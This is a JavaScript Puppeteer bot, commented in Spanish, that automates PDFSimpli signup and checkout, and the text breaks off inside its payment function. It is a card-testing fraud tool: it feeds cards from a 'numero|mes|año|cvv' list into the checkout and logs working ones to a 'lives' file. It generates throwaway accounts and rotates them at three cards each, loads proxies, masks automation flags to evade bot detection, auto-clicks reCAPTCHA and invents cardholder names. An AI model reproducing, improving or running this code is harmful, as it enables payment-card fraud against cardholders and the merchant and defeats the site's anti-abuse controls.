const puppeteer = require('puppeteer-core');
const fs = require('fs');
const path = require('path');

// CLASE PAGOAUTO MEJORADA - Integrada directamente
class PagoAuto {
    constructor(page) {
        this.page = page;
    }

    delay(ms) {
        return new Promise(res => setTimeout(res, ms));
    }

    async getFrames() {
        return this.page.frames();
    }

    async findXPath(frame, xpath) {
        const handles = await frame.$x(xpath);
        return handles.length ? handles[0] : null;
    }

    // ============================================================
    // NUMERO DE TARJETA (PRINCIPAL + FALLBACK)
    // ============================================================

    async buscarYCompletarTarjeta(tarjeta) {
        try {
            const frames = await this.getFrames();

            if (frames.length > 1) {
                const frame = frames[1];
                const selects = [
                    "#data",
                    "input[name='cardNumber']",
                    "input[placeholder*='card']",
                    "input[placeholder*='number']"
                ];

                for (const sel of selects) {
                    try {
                        const campo = await frame.waitForSelector(sel, { timeout: 1000 });
                        const maxlength = await frame.evaluate(el => el.getAttribute("maxlength"), campo);

                        if (maxlength && parseInt(maxlength) >= 16) {
                            await campo.click({ clickCount: 3 });
                            await campo.type(tarjeta.numero, { delay: 40 });
                            return true;
                        }
                    } catch {}
                }
            }

            return await this.buscarYCompletarTarjetaFallback(tarjeta);

        } catch {
            return await this.buscarYCompletarTarjetaFallback(tarjeta);
        }
    }

    async buscarYCompletarTarjetaFallback(tarjeta) {
        const frames = await this.getFrames();

        for (const frame of frames) {
            const selects = [
                "#data",
                "input[name='cardNumber']",
                "input[placeholder*='card']",
                "input[maxlength='16']",
                "input[maxlength='19']"
            ];

            for (const sel of selects) {
                try {
                    const campo = await frame.waitForSelector(sel, { timeout: 500 });
                    const maxlength = await frame.evaluate(el => el.getAttribute("maxlength"), campo);

                    if (maxlength && parseInt(maxlength) >= 16) {
                        await campo.click({ clickCount: 3 });
                        await campo.type(tarjeta.numero, { delay: 40 });
                        return true;
                    }
                } catch {}
            }
        }

        return false;
    }

    // ============================================================
    // NOMBRE DEL TITULAR
    // ============================================================

    async buscarYCompletarNombre(nombre) {
        const selects = [
            "#checkout_form_card_name",
            "input[name='cardName']",
            "input[placeholder*='name']",
            "input[placeholder*='nombre']",
            "input[name*='holder']"
        ];

        for (const sel of selects) {
            try {
                const campo = await this.page.waitForSelector(sel, { timeout: 1200 });
                await campo.click({ clickCount: 3 });
                await campo.type(nombre, { delay: 35 });
                return true;
            } catch {}
        }

        return false;
    }

    // ============================================================
    // CVV (PRINCIPAL + FALLBACK)
    // ============================================================

    async buscarYCompletarCVV(cvv) {
        try {
            const frames = await this.getFrames();

            if (frames.length > 6) {
                const frame = frames[6];
                const xpath = "//input[@maxlength='4' and (@id='data' or @name='Data')]";
                const campo = await this.findXPath(frame, xpath);
                
                if (campo) {
                    await campo.click({ clickCount: 3 });
                    await campo.type(cvv, { delay: 40 });
                    return true;
                }
            }

            return await this.buscarYCompletarCVVFallback(cvv);

        } catch {
            return await this.buscarYCompletarCVVFallback(cvv);
        }
    }

    async buscarYCompletarCVVFallback(cvv) {
        const frames = await this.getFrames();

        for (const frame of frames) {
            const selects = [
                "input[maxlength='3']",
                "input[maxlength='4']",
                "input[placeholder*='cvv']",
                "input[placeholder*='security']"
            ];

            for (const sel of selects) {
                try {
                    const campo = await frame.waitForSelector(sel, { timeout: 500 });
                    await campo.click({ clickCount: 3 });
                    await campo.type(cvv, { delay: 40 });
                    return true;
                } catch {}
            }
        }

        return false;
    }

    // ============================================================
    // FECHA DE EXPIRACION - VERSIÓN CORREGIDA (FUNCIONAL)
    // ============================================================

    async buscarYCompletarFecha(tarjeta) {
        let completo = 0;

        // ============================
        // MES debe ser "01", "02", ..., "12" (SIEMPRE 2 DÍGITOS)
        // ============================
        const mesValue = tarjeta.mes.toString().padStart(2, "0"); // siempre 2 dígitos
        this.log(`📌 Valor final del MES: ${mesValue}`);

        // ============================
        // AÑO debe ser "2026", "2030", etc.
        // ============================
        let anioValue = tarjeta.anio;
        if (anioValue.length === 2) {
            anioValue = "20" + anioValue;
        }
        this.log(`📌 Valor final del AÑO: ${anioValue}`);

        // SELECTORES REALES
        const selectMes = "select[name='ccMonthExp'], #expmo";
        const selectAnio = "select[name='ccYearExp'], #expyr";

        // ============================================================
        // 1) Seleccionar MES exactamente
        // ============================================================
        try {
            await this.page.waitForSelector(selectMes, { timeout: 1000 });

            // Debug: mostrar opciones del select
            const opciones = await this.page.$$eval(`${selectMes} option`, opts => opts.map(o => o.value));
            this.log(`📜 Opciones reales del MES: ${opciones}`);

            if (opciones.includes(mesValue)) {
                await this.page.select(selectMes, mesValue);
                this.log(`✅ MES seleccionado correctamente: ${mesValue}`);
                completo++;
            } else {
                this.log("❌ El value no existe en el select. MES no encontrado", "ERROR");
            }

        } catch (e) {
            this.log(`❌ Error seleccionando MES: ${e.message}`, "ERROR");
        }

        // ============================================================
        // 2) Seleccionar AÑO exactamente
        // ============================================================
        try {
            await this.page.waitForSelector(selectAnio, { timeout: 1000 });

            const opcionesA = await this.page.$$eval(`${selectAnio} option`, opts => opts.map(o => o.value));
            this.log(`📜 Opciones reales del AÑO: ${opcionesA}`);

            if (opcionesA.includes(anioValue)) {
                await this.page.select(selectAnio, anioValue);
                this.log(`✅ AÑO seleccionado correctamente: ${anioValue}`);
                completo++;
            } else {
                this.log("❌ El value del AÑO no existe", "ERROR");
            }

        } catch (e) {
            this.log(`❌ Error seleccionando AÑO: ${e.message}`, "ERROR");
        }

        // ============================================================
        // 3) FALLBACK: Si no funcionó, probar método alternativo
        // ============================================================
        if (completo < 2) {
            this.log("🔄 Probando método alternativo para fecha...", "WARNING");
            
            // Intentar con selectores individuales
            const selectoresIndividuales = [
                { selector: "#expmo", valor: mesValue, tipo: "mes" },
                { selector: "select[name='ccMonthExp']", valor: mesValue, tipo: "mes" },
                { selector: "#expyr", valor: anioValue, tipo: "año" },
                { selector: "select[name='ccYearExp']", valor: anioValue, tipo: "año" }
            ];

            for (const item of selectoresIndividuales) {
                try {
                    await this.page.waitForSelector(item.selector, { timeout: 500 });
                    await this.page.select(item.selector, item.valor);
                    this.log(`✅ ${item.tipo.toUpperCase()} seleccionado (alternativo): ${item.valor}`);
                    if (item.tipo === "mes") completo++;
                    if (item.tipo === "año") completo++;
                } catch (e) {
                    // Continuar con el siguiente selector
                }
            }
        }

        // ============================================================
        // Resultado final
        // ============================================================
        this.log(`📊 Resultado fecha: ${completo}/2 campos completados`);

        return completo >= 2;
    }

    // ============================================================
    // TÉRMINOS Y CONDICIONES - VERSIÓN MEJORADA
    // ============================================================

    async marcarTerminos() {
        this.log("🟦 Intentando marcar Términos y Condiciones...");

        const selectores = [
            "#acceptCheckboxMark",
            "span[id='acceptCheckboxMark']",
            "input[type='checkbox']",
            "input[name*='terms']",
            "input[name*='accept']"
        ];

        let marcado = false;

        // ============================================
        // 1. Intentar marcar usando CSS selector
        // ============================================
        for (const selector of selectores) {
            try {
                await this.page.waitForSelector(selector, { timeout: 1000 });

                // Verificar si ya está marcado
                const yaMarcado = await this.page.evaluate((sel) => {
                    const el = document.querySelector(sel);
                    if (!el) return false;
                    return el.checked || 
                           el.getAttribute("aria-checked") === "true" ||
                           el.classList.contains("checked");
                }, selector);

                if (yaMarcado) {
                    this.log("🟩 Checkbox ya estaba marcado.");
                    return true;
                }

                // Intentar marcar
                await this.page.click(selector, { delay: 100 });
                await this.delay(200);

                // Verificar si se marcó
                marcado = await this.page.evaluate((sel) => {
                    const el = document.querySelector(sel);
                    if (!el) return false;
                    return el.checked || 
                           el.getAttribute("aria-checked") === "true" ||
                           el.classList.contains("checked");
                }, selector);

                if (marcado) {
                    this.log(`✅ Checkbox marcado correctamente con selector: ${selector}`);
                    return true;
                }

            } catch (_) {
                // Continuar con el siguiente selector
            }
        }

        // ============================================
        // 2. Intentar marcar usando XPATH
        // ============================================
        try {
            const [elemento] = await this.page.$x("//span[@id='acceptCheckboxMark']");
            if (elemento) {
                await elemento.click({ delay: 100 });
                await this.delay(200);

                const estado = await this.page.evaluate(el => {
                    return el.classList.contains("checked") ||
                           el.getAttribute("aria-checked") === "true";
                }, elemento);

                if (estado) {
                    this.log("✅ Checkbox marcado correctamente (por XPATH)");
                    return true;
                }
            }
        } catch (_) {}

        // ============================================
        // 3. Último intento con clic en coordenadas
        // ============================================
        try {
            const checkbox = await this.page.$('#acceptCheckboxMark');
            if (checkbox) {
                const box = await checkbox.boundingBox();
                if (box) {
                    await this.page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
                    await this.delay(200);
                    
                    const estadoFinal = await this.page.evaluate((sel) => {
                        const el = document.querySelector(sel);
                        return el.checked || 
                               el.getAttribute("aria-checked") === "true" ||
                               el.classList.contains("checked");
                    }, '#acceptCheckboxMark');

                    if (estadoFinal) {
                        this.log("✅ Checkbox marcado con clic en coordenadas");
                        return true;
                    }
                }
            }
        } catch (_) {}

        this.log("❌ No se logró marcar el checkbox.");
        return false;
    }

    // ============================================================
    // BOTON CONTINUAR/PAGAR
    // ============================================================

    async clickContinuar() {
        await this.delay(1500);

        const selects = [
            "button[type='submit']",
            "button#continue",
            "button#next",
            "button#confirm",
            "#planPageContinueButton",
            'input[type="submit"]',
            'input[value="Continue"]',
            'input[value="Pagar"]',
            'button:contains("Continue")',
            'button:contains("Continuar")',
            'button:contains("Pagar")',
            'button:contains("Pay")'
        ];

        for (const sel of selects) {
            try {
                let btn;
                if (sel.includes('contains')) {
                    const buttons = await this.page.$$('button');
                    for (const button of buttons) {
                        const text = await this.page.evaluate(el => el.textContent, button);
                        if (text && text.toLowerCase().includes(sel.toLowerCase().replace('button:contains("', '').replace('")', ''))) {
                            btn = button;
                            break;
                        }
                    }
                } else {
                    btn = await this.page.$(sel);
                }

                if (!btn) continue;

                const box = await btn.boundingBox();
                if (!box) continue;

                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.delay(100);
                await this.page.mouse.down();
                await this.delay(60);
                await this.page.mouse.up();

                // Esperar navegación o cambio
                await this.delay(3000);
                return true;

            } catch {}
        }

        return false;
    }

    // Método auxiliar para logging
    log(mensaje, tipo = 'INFO') {
        const timestamp = new Date().toLocaleTimeString();
        const logLine = `[${timestamp}] [PagoAuto] ${mensaje}`;
        
        if (tipo === 'ERROR') {
            console.log(`\x1b[91m${logLine}\x1b[0m`);
        } else if (tipo === 'WARNING') {
            console.log(`\x1b[93m${logLine}\x1b[0m`);
        } else {
            console.log(logLine);
        }
    }
}

// CLASE PRINCIPAL DEL BOT
class BotPDFSimpli {
    constructor() {
        // Configuración de rutas para Termux
        this.rutaPdf = '/sdcard/Download';
        this.archivoTarjetas = '/sdcard/Download/tarjetas.txt';
        this.archivoLives = '/sdcard/Download/lives.txt';
        this.archivoCuentas = '/sdcard/Download/cuentas_pdfsimpli.json';
        this.archivoProxies = '/sdcard/Download/proxies.txt';
        this.archivoLog = '/sdcard/Download/bot_log.txt';
        
        // Estado del bot
        this.browser = null;
        this.page = null;
        this.cuentas = [];
        this.cuentaActual = null;
        this.proxies = [];
        this.proxyActual = null;
        
        // Configuración
        this.maxTarjetasPorCuenta = 3;
        this.maxReintentosClic = 20;
        this.tiempoEsperaEntreReintentos = 1000;
        
        // Sistema de pago
        this.pagoAuto = null;
        
        // Estadísticas
        this.estadisticas = {
            tarjetasProcesadas: 0,
            tarjetasValidas: 0,
            cuentasUsadas: 0,
            errores: 0,
            recaptchasResueltos: 0,
            recaptchasManuales: 0,
            reintentosClic: 0,
            tiempoEsperaAcumulado: 0
        };

        // Inicialización
        this.cargarProxies();
        this.cargarOGenerarCuentas();
        this.crearArchivosNecesarios();
        this.inicializarLog();
    }

    // SISTEMA DE LOGGING
    inicializarLog() {
        const timestamp = new Date().toISOString();
        const logHeader = `\n\n=== INICIO DE SESIÓN - ${timestamp} ===\n`;
        fs.appendFileSync(this.archivoLog, logHeader, 'utf8');
    }

    async log(mensaje, tipo = 'INFO') {
        const timestamp = new Date().toLocaleTimeString();
        const logLine = `[${timestamp}] [${tipo}] ${mensaje}\n`;
        
        if (tipo === 'ERROR') {
            console.log(`\x1b[91m${mensaje}\x1b[0m`);
        } else if (tipo === 'SUCCESS') {
            console.log(`\x1b[92m${mensaje}\x1b[0m`);
        } else if (tipo === 'WARNING') {
            console.log(`\x1b[93m${mensaje}\x1b[0m`);
        } else {
            console.log(mensaje);
        }
        
        fs.appendFileSync(this.archivoLog, logLine, 'utf8');
    }

    async logError(error, contexto) {
        await this.log(`💥 ERROR en ${contexto}: ${error.message}`, 'ERROR');
        if (this.page) {
            try {
                const url = await this.page.url();
                await this.log(`📍 URL actual: ${url}`, 'ERROR');
            } catch (e) {}
        }
    }

    // CONFIGURACIÓN INICIAL
    crearArchivosNecesarios() {
        try {
            if (!fs.existsSync(this.archivoTarjetas)) {
                fs.writeFileSync(this.archivoTarjetas, "# Formato: numero|mes|año|cvv\n5124013001057531|03|2030|275\n", 'utf8');
                this.log('📁 Archivo de tarjetas creado');
            }
            
            if (!fs.existsSync(this.archivoLives)) {
                fs.writeFileSync(this.archivoLives, "# Tarjetas válidas encontradas\n", 'utf8');
            }
            
            if (!fs.existsSync(this.archivoProxies)) {
                fs.writeFileSync(this.archivoProxies, "# Formato: ip:puerto\n", 'utf8');
            }
        } catch (error) {
            this.log('❌ Error creando archivos necesarios', 'ERROR');
        }
    }

    async delay(ms) {
        this.estadisticas.tiempoEsperaAcumulado += ms;
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // SISTEMA DE REINTENTOS INTELIGENTES
    async ejecutarConReintentos(accion, descripcion, maxReintentos = 3, delayEntreReintentos = 3000) {
        for (let intento = 1; intento <= maxReintentos; intento++) {
            try {
                this.log(`🔄 Ejecutando ${descripcion} [Intento ${intento}/${maxReintentos}]`);
                const resultado = await accion();
                
                if (resultado === true) {
                    this.log(`✅ ${descripcion} exitoso`, 'SUCCESS');
                    return true;
                }
                
                if (resultado === false && intento < maxReintentos) {
                    this.log(`⚠️ ${descripcion} falló, reintentando...`, 'WARNING');
                    await this.delay(delayEntreReintentos);
                    continue;
                }
                
                return resultado;
                
            } catch (error) {
                this.logError(error, `${descripcion} - intento ${intento}`);
                
                if (intento < maxReintentos) {
                    await this.delay(delayEntreReintentos);
                }
            }
        }
        
        this.log(`❌ ${descripcion} falló después de ${maxReintentos} intentos`, 'ERROR');
        return false;
    }

    // SISTEMA DE PROXIES
    cargarProxies() {
        try {
            if (fs.existsSync(this.archivoProxies)) {
                const data = fs.readFileSync(this.archivoProxies, 'utf8');
                const lineas = data.split('\n');
                for (const linea of lineas) {
                    const lineaClean = linea.trim();
                    if (lineaClean && !lineaClean.startsWith('#')) {
                        this.proxies.push(lineaClean);
                    }
                }
                this.log(`✅ ${this.proxies.length} proxies cargados`);
            }
        } catch (error) {
            this.log('⚠️ No se pudieron cargar proxies');
        }
    }

    // SISTEMA DE CUENTAS
    cargarOGenerarCuentas() {
        try {
            if (fs.existsSync(this.archivoCuentas)) {
                const data = JSON.parse(fs.readFileSync(this.archivoCuentas, 'utf8'));
                this.cuentas = data.cuentas || [];
                this.log(`✅ ${this.cuentas.length} cuentas cargadas`);
                
                this.cuentas.forEach(cuenta => {
                    if (cuenta.tarjetasProcesadas === undefined) {
                        cuenta.tarjetasProcesadas = 0;
                    }
                });
            } else {
                this.generarListaCuentas();
                this.guardarCuentas();
                this.log(`✅ ${this.cuentas.length} cuentas generadas`);
            }
        } catch (error) {
            this.generarListaCuentas();
            this.guardarCuentas();
        }
    }

    generarListaCuentas() {
        const nombres = ['juan', 'maria', 'carlos', 'ana', 'luis', 'laura'];
        const apellidos = ['garcia', 'rodriguez', 'gonzalez', 'fernandez', 'lopez'];
        
        this.cuentas = [];
        
        for (let i = 1; i <= 50; i++) {
            const nombre = nombres[Math.floor(Math.random() * nombres.length)];
            const apellido = apellidos[Math.floor(Math.random() * apellidos.length)];
            const numero = Math.floor(10000 + Math.random() * 90000);
            const dominio = Math.random() > 0.5 ? 'gmail.com' : 'outlook.com';
            
            const email = `${nombre}.${apellido}${numero}@${dominio}`;
            const password = `${nombre.charAt(0).toUpperCase() + nombre.slice(1)}${apellido.charAt(0).toUpperCase() + apellido.slice(1)}${Math.floor(100 + Math.random() * 900)}!`;
            
            this.cuentas.push({
                email: email,
                password: password,
                usada: false,
                tarjetasProcesadas: 0,
                fechaCreacion: new Date().toISOString(),
                ultimoUso: null,
                exitosas: 0,
                fallidas: 0
            });
        }
    }

    guardarCuentas() {
        try {
            const data = {
                cuentas: this.cuentas,
                ultimaActualizacion: new Date().toISOString(),
                totalCuentas: this.cuentas.length
            };
            fs.writeFileSync(this.archivoCuentas, JSON.stringify(data, null, 2));
        } catch (error) {
            this.log('❌ Error guardando cuentas', 'ERROR');
        }
    }

    obtenerProximaCuenta() {
        const cuentasDisponibles = this.cuentas.filter(c => 
            !c.usada || c.tarjetasProcesadas < this.maxTarjetasPorCuenta
        );
        
        if (cuentasDisponibles.length === 0) {
            this.log('❌ No hay cuentas disponibles', 'ERROR');
            return null;
        }
        
        // Preferir cuentas no usadas
        const cuentasNoUsadas = cuentasDisponibles.filter(c => !c.usada);
        if (cuentasNoUsadas.length > 0) {
            return cuentasNoUsadas[Math.floor(Math.random() * cuentasNoUsadas.length)];
        }
        
        // Si no hay cuentas no usadas, usar una con menos tarjetas procesadas
        return cuentasDisponibles.sort((a, b) => a.tarjetasProcesadas - b.tarjetasProcesadas)[0];
    }

    // NAVEGADOR
    async iniciarNavegador() {
        return await this.ejecutarConReintentos(async () => {
            this.log('🚀 Iniciando navegador...');
            
            const options = {
                headless: false,
                executablePath: '/data/data/com.termux/files/usr/bin/chromium-browser',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--window-size=1200,800',
                    '--ignore-certificate-errors',
                    '--ignore-ssl-errors',
                    '--disable-web-security',
                    '--disable-blink-features=AutomationControlled'
                ],
                ignoreHTTPSErrors: true
            };

            this.browser = await puppeteer.launch(options);
            this.page = await this.browser.newPage();
            
            await this.page.setDefaultNavigationTimeout(30000);
            await this.page.setDefaultTimeout(15000);
            await this.page.setViewport({ width: 1200, height: 800 });
            
            await this.page.setUserAgent('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
            
            await this.page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            });

            // Inicializar PagoAuto
            this.pagoAuto = new PagoAuto(this.page);

            this.log('✅ Navegador configurado', 'SUCCESS');
            return true;
        }, 'iniciar navegador', 2, 3000);
    }

    // SISTEMA DE CLICS INTELIGENTES
    async clicInteligente(selectores, descripcion, tiempoEspera = 3000) {
        this.log(`🎯 Buscando: ${descripcion}`);
        
        for (let intento = 1; intento <= this.maxReintentosClic; intento++) {
            try {
                this.log(`🔄 [Intento ${intento}/${this.maxReintentosClic}] Buscando: ${descripcion}`);
                
                for (const selector of selectores) {
                    try {
                        let elemento = null;
                        
                        if (selector.tipo === 'id') {
                            elemento = await this.page.$(selector.valor);
                        } else if (selector.tipo === 'texto') {
                            const elementos = await this.page.$$(selector.elemento || 'button, a, input[type="submit"], span, div');
                            for (const elem of elementos) {
                                try {
                                    const texto = await this.page.evaluate(el => el.textContent?.trim(), elem);
                                    if (texto && texto.toLowerCase().includes(selector.valor.toLowerCase())) {
                                        elemento = elem;
                                        break;
                                    }
                                } catch (e) {
                                    continue;
                                }
                            }
                        }

                        if (elemento) {
                            this.log(`✅ Elemento encontrado: ${selector.tipo} - ${selector.valor}`, 'SUCCESS');
                            
                            await elemento.evaluate(el => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
                            await this.delay(1000);
                            
                            try {
                                await elemento.click();
                            } catch (error) {
                                await this.page.evaluate((el) => {
                                    el.click();
                                }, elemento);
                            }
                            
                            this.log(`🎉 Clic exitoso en: ${descripcion}`, 'SUCCESS');
                            await this.delay(tiempoEspera);
                            return true;
                        }
                    } catch (error) {
                        continue;
                    }
                }
                
                await this.delay(this.tiempoEsperaEntreReintentos);
                this.estadisticas.reintentosClic++;
                
            } catch (error) {
                this.logError(error, `intento ${intento} para ${descripcion}`);
                await this.delay(this.tiempoEsperaEntreReintentos);
            }
        }
        
        this.log(`❌ No se pudo hacer clic en: ${descripcion} después de ${this.maxReintentosClic} intentos`, 'ERROR');
        return false;
    }

    // FLUJO PRINCIPAL - SUBIR PDF
    async subirPDF() {
        return await this.ejecutarConReintentos(async () => {
            try {
                this.log('📁 Buscando PDF...');
                
                const archivos = fs.readdirSync(this.rutaPdf);
                const pdfs = archivos.filter(f => f.toLowerCase().endsWith('.pdf'));
                
                if (pdfs.length === 0) {
                    this.log('❌ No hay PDFs en la carpeta', 'ERROR');
                    return false;
                }

                const pdfPath = path.join(this.rutaPdf, pdfs[0]);
                this.log(`🎯 PDF seleccionado: ${pdfs[0]}`);

                await this.delay(2000);

                const inputFile = await this.page.$('input[type="file"]');
                if (!inputFile) {
                    this.log('❌ No se encontró input file', 'ERROR');
                    return false;
                }

                await inputFile.uploadFile(pdfPath);
                this.log('✅ PDF subido', 'SUCCESS');
                
                await this.delay(5000);
                return true;

            } catch (error) {
                this.logError(error, 'subirPDF');
                return false;
            }
        }, 'subir PDF', 2, 3000);
    }

    async hacerClicConvert() {
        const selectores = [
            { tipo: 'id', valor: '#ConvertContinue' },
            { tipo: 'texto', valor: 'convert', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'continue', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'convertir', elemento: 'button, input, div' }
        ];
        
        return await this.clicInteligente(selectores, 'CONVERTIR PDF', 3000);
    }

    async hacerClicDownload() {
        const selectores = [
            { tipo: 'id', valor: '#congDwnaut' },
            { tipo: 'texto', valor: 'download', elemento: 'button, a, div, input' },
            { tipo: 'texto', valor: 'get file', elemento: 'button, a, div, input' },
            { tipo: 'texto', valor: 'descargar', elemento: 'button, a, div, input' }
        ];
        
        return await this.clicInteligente(selectores, 'DESCARGAR', 3000);
    }

    // SISTEMA DE REGISTRO
    async manejarRegistro() {
        return await this.ejecutarConReintentos(async () => {
            try {
                this.log('👤 Iniciando proceso de registro...');
                await this.delay(3000);

                if (!this.cuentaActual) {
                    this.cuentaActual = this.obtenerProximaCuenta();
                    if (!this.cuentaActual) return false;
                }

                this.log(`🔄 Cuenta asignada: ${this.cuentaActual.email}`);

                const campos = await this.buscarCamposRegistroCompleto();
                if (!campos) {
                    this.log('❌ No se encontraron campos de registro', 'ERROR');
                    return false;
                }

                this.log('📝 Completando registro...');
                this.log(`📧 Email: ${this.cuentaActual.email}`);
                this.log(`🔑 Password: ${this.cuentaActual.password}`);

                await campos.email.click({ clickCount: 3 });
                await campos.email.type(this.cuentaActual.email, { delay: 50 });
                
                await campos.password.click({ clickCount: 3 });
                await campos.password.type(this.cuentaActual.password, { delay: 50 });

                this.log('✅ Campos de registro completados', 'SUCCESS');

                if (!await this.hacerClicRegistro()) {
                    return false;
                }

                await this.delay(3000);

                await this.manejarRecaptcha();

                await this.delay(3000);

                const url = await this.page.url();
                if (url.includes('pdfsimpli.com') && !url.includes('signup') && !url.includes('register')) {
                    this.log('✅ Registro exitoso - redireccionado correctamente', 'SUCCESS');
                    return true;
                }

                this.log('✅ Continuando después del registro', 'SUCCESS');
                return true;

            } catch (error) {
                this.logError(error, 'manejarRegistro');
                return false;
            }
        }, 'manejar registro', 2, 3000);
    }

    async buscarCamposRegistroCompleto() {
        try {
            this.log('🔍 Búsqueda exhaustiva de campos de registro...');
            
            let campoEmail = await this.page.$('input[type="email"]');
            let campoPassword = await this.page.$('input[type="password"]');
            
            if (!campoEmail) campoEmail = await this.page.$('input[name="email"], input[name="username"], input[name="user"]');
            if (!campoPassword) campoPassword = await this.page.$('input[name="password"], input[name="pass"], input[name="pwd"]');
            
            if (!campoEmail) {
                const inputs = await this.page.$$('input');
                for (const input of inputs) {
                    const placeholder = await input.evaluate(el => el.placeholder);
                    if (placeholder && (placeholder.toLowerCase().includes('email') || placeholder.toLowerCase().includes('correo') || placeholder.toLowerCase().includes('username'))) {
                        campoEmail = input;
                        break;
                    }
                }
            }
            
            if (!campoPassword) {
                const inputs = await this.page.$$('input');
                for (const input of inputs) {
                    const placeholder = await input.evaluate(el => el.placeholder);
                    if (placeholder && (placeholder.toLowerCase().includes('password') || placeholder.toLowerCase().includes('contraseña') || placeholder.toLowerCase().includes('pass'))) {
                        campoPassword = input;
                        break;
                    }
                }
            }

            if (!campoEmail) campoEmail = await this.page.$('#email, #username, #user, #login');
            if (!campoPassword) campoPassword = await this.page.$('#password, #pass, #pwd, #login-password');
            
            if (campoEmail && campoPassword) {
                this.log('✅ Campos de registro encontrados', 'SUCCESS');
                return { email: campoEmail, password: campoPassword };
            }
            
            this.log('❌ No se pudieron encontrar ambos campos de registro');
            return null;
            
        } catch (error) {
            this.logError(error, 'buscarCamposRegistroCompleto');
            return null;
        }
    }

    async hacerClicRegistro() {
        const selectores = [
            { tipo: 'id', valor: '#sign-up' },
            { tipo: 'texto', valor: 'sign up', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'register', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'crear cuenta', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'registrarse', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'signup', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'join', elemento: 'button, input, div' }
        ];
        
        return await this.clicInteligente(selectores, 'BOTÓN REGISTRO', 3000);
    }

    // SISTEMA DE reCAPTCHA
    async manejarRecaptcha() {
        try {
            this.log("🔍 Buscando reCAPTCHA v2 checkbox...");
            await this.delay(1000);

            const anchorFrame = this.page.frames().find(f =>
                f.url().includes("recaptcha/api2/anchor")
            );

            if (!anchorFrame) {
                this.log("✔ No se detectó reCAPTCHA", "SUCCESS");
                return true;
            }

            this.log("🎯 Iframe anchor detectado");

            let realFrame = anchorFrame;
            let anchor = null;

            for (let i = 0; i < 15; i++) {
                for (const frame of this.page.frames()) {
                    if (frame.url().includes("recaptcha") &&
                        await frame.$("#recaptcha-anchor")) {
                        realFrame = frame;
                        anchor = await frame.$("#recaptcha-anchor");
                        break;
                    }
                }
                if (anchor) break;
                await this.delay(300);
            }

            if (!anchor) {
                this.log("❌ No se encontró el anchor REAL (iframe interno)", "ERROR");
                return true;
            }

            this.log("🧩 Anchor interno detectado ✔");

            const yaMarcado = await realFrame.$eval("#recaptcha-anchor", el =>
                el.getAttribute("aria-checked") === "true"
            );

            if (yaMarcado) {
                this.log("✅ reCAPTCHA ya estaba resuelto", "SUCCESS");
                return true;
            }

            const box = await anchor.boundingBox();
            if (!box) {
                this.log("❌ Error obteniendo boundingBox", "ERROR");
                return true;
            }

            this.log(`📍 Coordenadas: (${Math.round(box.x + box.width / 2)}, ${Math.round(box.y + box.height / 2)})`);
            this.log("🖱 Enviando click humano...");

            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(80);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();

            this.log("⏳ Verificando estado...");
            await this.delay(1500);

            const marcado = await realFrame.$eval("#recaptcha-anchor", el =>
                el.getAttribute("aria-checked") === "true"
            );

            if (marcado) {
                this.log("✅ reCAPTCHA resuelto ✔", "SUCCESS");
                this.estadisticas.recaptchasResueltos++;
                return true;
            }

            this.log("⚠ No se marcó, puede haber challenge", "WARNING");
            
            const challengeFrame = this.page.frames().find(f =>
                f.url().includes("recaptcha/api2/bframe")
            );

            if (challengeFrame) {
                this.log("⚠️ Se abrió challenge de imágenes - continuando después de espera", "WARNING");
                await this.delay(5000);
                this.estadisticas.recaptchasManuales++;
            }

            return true;

        } catch (err) {
            this.logError(err, "manejarRecaptcha");
            return true;
        }
    }

    // CONTINUAR A PÁGINA DE PAGO
    async hacerClicContinuePlan() {
        const selectores = [
            { tipo: 'id', valor: '#planPageContinueButton' },
            { tipo: 'texto', valor: 'continue', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'continuar', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'next', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'siguiente', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'proceed', elemento: 'button, input, div' }
        ];
        
        return await this.clicInteligente(selectores, 'CONTINUAR A PAGO', 5000);
    }

    // SISTEMA DE PAGO MEJORADO - FLUJO CORREGIDO
    async completarInformacionPago(tarjeta) {
        return await this.ejecutarConReintentos(async () => {
            try {
                this.log('💳 Iniciando proceso de pago con PagoAuto...');
                await this.delay(3000);

                if (!this.pagoAuto) {
                    this.log('❌ PagoAuto no inicializado', 'ERROR');
                    return false;
                }

                let camposCompletados = 0;
                const camposRequeridos = [];

                // 1. Número de tarjeta
                this.log('🔢 Completando número de tarjeta...');
                if (await this.pagoAuto.buscarYCompletarTarjeta(tarjeta)) {
                    camposCompletados++;
                    camposRequeridos.push('numero');
                    this.log('✅ Número de tarjeta completado', 'SUCCESS');
                } else {
                    this.log('❌ No se pudo completar número de tarjeta', 'ERROR');
                }

                await this.delay(1000);

                // 2. Nombre del titular
                this.log('👤 Completando nombre del titular...');
                const nombre = this.generarNombreAleatorio();
                if (await this.pagoAuto.buscarYCompletarNombre(nombre)) {
                    camposCompletados++;
                    camposRequeridos.push('nombre');
                    this.log(`✅ Nombre completado: ${nombre}`, 'SUCCESS');
                } else {
                    this.log('⚠️ No se pudo completar nombre', 'WARNING');
                }

                await this.delay(1000);

                // 3. Fecha de expiración - VERSIÓN CORREGIDA
                this.log('📅 Completando fecha de expiración...');
                if (await this.pagoAuto.buscarYCompletarFecha(tarjeta)) {
                    camposCompletados++;
